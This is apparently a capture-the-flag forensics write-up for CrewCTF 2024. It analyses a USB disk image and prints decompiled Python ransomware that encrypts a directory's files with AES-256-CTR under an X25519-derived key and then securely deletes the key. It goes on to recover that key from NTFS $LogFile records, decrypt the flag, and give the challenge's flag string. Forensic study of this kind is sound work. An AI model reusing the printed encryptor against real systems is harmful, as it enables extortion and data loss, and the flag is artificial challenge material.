Community writeups (probably better than this one):

- https://warlocksmurf.github.io/posts/crewctf2024/#fiilllleeeeeeee-forensics

# Initial Analysis

From the challenge description we can see that our objective is to decrypt `flag.txt` using the contents of `fiilllleeeeeeee.ad1` (a disk image of a USB drive).

Opening the disk image in FTK reveals four regular files:

- `sdelete64.exe` - A standard Microsoft executable for securely deleting files.
- `fiilllleeeeeeee.exe` - A custom executable.
- `Autorun.inf` - A file used to automatically run `fiilllleeeeeeee.exe` when the USB stick is inserted.
- `message.txt` - A ransom note.

# Decompilation

We can extract `fiilllleeeeeeee.exe` and deduce from its icon that it is a PyInstaller executable.

There are many ways of recovering the original python from PyInstaller binaries. We will use [pyinstxtractor-ng](https://github.com/pyinstxtractor/pyinstxtractor-ng) to extract the `.pyc` files and [PyLingual](https://pylingual.io/) to decompile `fiilllleeeeeeee.pyc`:

```python
import subprocess
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes
from hashlib import sha256
from pathlib import Path
import os
import shelve
import sys
PUBLIC_KEY = X25519PublicKey.from_public_bytes(bytes.fromhex('18099b8ba29b20553ee1fb36280fce8fcd616d036c70d24fe7918bc199baa879'))
if getattr(sys, 'frozen', False):
    WORKING_DIRECTORY = Path(sys.executable).parent
else:
    WORKING_DIRECTORY = Path(__file__).parent
SHARED_KEY_FILE = WORKING_DIRECTORY / 'shared_key'
MESSAGE_FILE = WORKING_DIRECTORY / 'message.txt'
SDELETE_FILE = WORKING_DIRECTORY / 'sdelete64.exe'
ENCRYPT_DIRECTORY = Path.home() / 'Documents' / 'is_you_happen_to_have_a_directory_named_this_and_they_get_encrypted_then_its_on_you'
MAGIC = b'ENCRYPTED\x00\x00\x00\xde\xad\xbe\xef'

def main():
    if SHARED_KEY_FILE.exists():
        shared_key = SHARED_KEY_FILE.read_bytes()
    else:
        private_key = X25519PrivateKey.generate()
        public_key = private_key.public_key().public_bytes_raw()
        shared_key = sha256(private_key.exchange(PUBLIC_KEY)).digest()
        MESSAGE_FILE.write_text(f'\n        Whoops! Looks your files are encrypted.\n        Email fake@example.com quoting the following unique ID to decrypt your files:\n        {public_key.hex()}\n        ')
        SHARED_KEY_FILE.write_bytes(shared_key)
    if ENCRYPT_DIRECTORY.exists() and ENCRYPT_DIRECTORY.is_dir():
        for file in ENCRYPT_DIRECTORY.iterdir():
            if not file.is_file():
                continue
            contents = file.read_bytes()
            if contents.startswith(MAGIC):
                continue
            nonce = os.urandom(algorithms.AES256.block_size // 8)
            cipher = Cipher(algorithms.AES256(shared_key), modes.CTR(nonce))
            encryptor = cipher.encryptor()
            file.write_bytes(MAGIC + nonce + encryptor.update(contents) + encryptor.finalize())
    SHARED_KEY_FILE.write_bytes(b'A' * SHARED_KEY_FILE.stat().st_size)
    subprocess.call([str(SDELETE_FILE.resolve()), '/accepteula', str(SHARED_KEY_FILE.resolve())])
    subprocess.call(['notepad.exe', MESSAGE_FILE.resolve()])
if __name__ == '__main__':
    main()
```

We can see that the program:

- Creates a shared key an saves it to `shared_key`.
- Encrypts files using the shared key.
- Overwrites the `shared_key` file with `A`s, before using `sdelete64.exe` to delete it.

So, if we can recover `shared_key`, we will be able to decrypt `flag.txt`.

# Recovering `shared_key`

Recovering `shared_key` is the hard part of this challenge. The use of `sdelete64.exe`, combined with the fact that `shared_key`'s contents are effectively random means that most file recovery techniques will not work.

After some searching, we come across `$LogFile`, an artifact used to record transactions in order to recover from file system errors. It is possible that overwriting `shared_key`'s contents could be such a transaction, and that `$LogFile` may therefore hold the original contents.

To parse `$LogFile` we will use [LogFileParser](https://github.com/jschicht/LogFileParser) and load the resulting `LogFile.csv` into Excel. We can filter the `FileName` column to only show `shared_key` and locate the fifth record (`DeleteAttribute` on `$DATA`) which informs us that there is more information in `debug.log`. Searching for the corresponding LSN in `debug.log` reveals this record:

``` 
$DATA for MFT 43 in LSN 4211669:
0000	00 e0 e4 1e ef 5f a2 44  91 80 ac de e9 71 e2 20   ....._.D.....q. 
0010	a3 3f 2c e6 30 a4 11 ad  3a e8 66 8c e6 26 14 74   .?,.0...:.f..&.t
```

It seems likely that this is the shared key.

# Decrypting the Flag

Now we just need to reverse the decryption process:

```python
from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes

from pathlib import Path

MAGIC = b'ENCRYPTED\x00\x00\x00\xde\xad\xbe\xef'

SHARED_KEY = bytes.fromhex("""
00 e0 e4 1e ef 5f a2 44  91 80 ac de e9 71 e2 20
a3 3f 2c e6 30 a4 11 ad  3a e8 66 8c e6 26 14 74
""")

FLAG = Path("flag.txt").read_bytes()

nonce = FLAG[len(MAGIC):len(MAGIC)+algorithms.AES.block_size//8]
ct = FLAG[len(MAGIC)+len(nonce):]

cipher = Cipher(algorithms.AES256(SHARED_KEY), modes.CTR(nonce))
decryptor = cipher.decryptor()

print(decryptor.update(ct) + decryptor.finalize())
```

And we get the flag: `crew{d0_y0u_637_7h3_ch4ll3n63_n4m3?_f4a73851}`